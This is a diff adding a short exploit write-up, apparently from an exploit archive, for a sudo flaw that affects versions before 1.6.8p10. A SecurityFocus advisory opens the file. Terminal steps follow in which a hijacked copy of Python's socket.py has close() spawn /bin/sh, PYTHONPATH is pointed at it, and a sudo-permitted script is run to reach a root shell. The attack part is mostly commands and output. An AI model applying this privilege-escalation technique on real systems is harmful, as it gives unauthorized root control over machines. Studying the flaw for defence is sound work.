@@ -1,0 +1,67 @@
+source: http://www.securityfocus.com/bid/16184/info
+ 
+Sudo is prone to a security-bypass vulnerability that could lead to arbitrary code execution. This issue is due to an error in the application when handling environment variables.
+ 
+A local attacker with the ability to run Python scripts can exploit this vulnerability to gain access to an interactive Python prompt. That attacker may then execute arbitrary code with elevated privileges, facilitating the complete compromise of affected computers.
+ 
+An attacker must have the ability to run Python scripts through Sudo to exploit this vulnerability.
+ 
+This issue is similar to BID 15394 (Sudo Perl Environment Variable Handling Security Bypass Vulnerability). 
+
+## Sudo local root escalation privilege ##
+## vuln versions :  sudo < 1.6.8p10
+## adv : http://www.securityfocus.com/bid/16184
+## by breno - breno at kalangolinux dot org
+
+## You need sudo access execution for some python script ##
+
+
+## First look sudoers file. User 'breno' can execute expl_python_sudo.py script
+
+breno  ~ $ -> cat /etc/sudoers
+
+breno   ALL=(ALL) /home/breno/expl_python_sudo.py
+
+## Second, see our simple PoC python script
+
+breno  ~ $ -> cat /home/breno/expl_python_sudo.py
+#!/usr/bin/python
+import sys
+import socket
+import os
+
+print "Python Sudo Exploit"
+exp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+exp.close()
+breno  ~ $ ->
+
+## Sexy !! Do nothing :)
+
+## Ok. What you need to do to get root is hijacking socket.py module , change close()
+function to execute something and
+## change PYTHONPTAH env.
+
+breno  ~ $ -> cp /usr/lib/python2.3/socket.py /home/breno/
+
+breno  ~ $ -> vi /home/breno/socket.py
+...
+import os
+...
+def close(self):
+os.execl("/bin/sh","/bin/ah");
+self._sock = _closedsocket()
+self.send = self.recv = self.sendto = self.recvfrom = self._sock._dummy
+close.__doc__ = _realsocket.close.__doc__
+...
+
+## Ok .. save it and export env
+
+breno  ~ $ -> export PYTHONPATH=/home/breno
+
+## .. and execute script. Too much sexy !!!
+
+breno  ~ $ -> sudo /home/breno/expl_python_sudo.py
+Python Sudo Exploit
+root  ~ # -> id
+uid=0(root) gid=0(root) grupos=0(root)
+root  ~ # ->
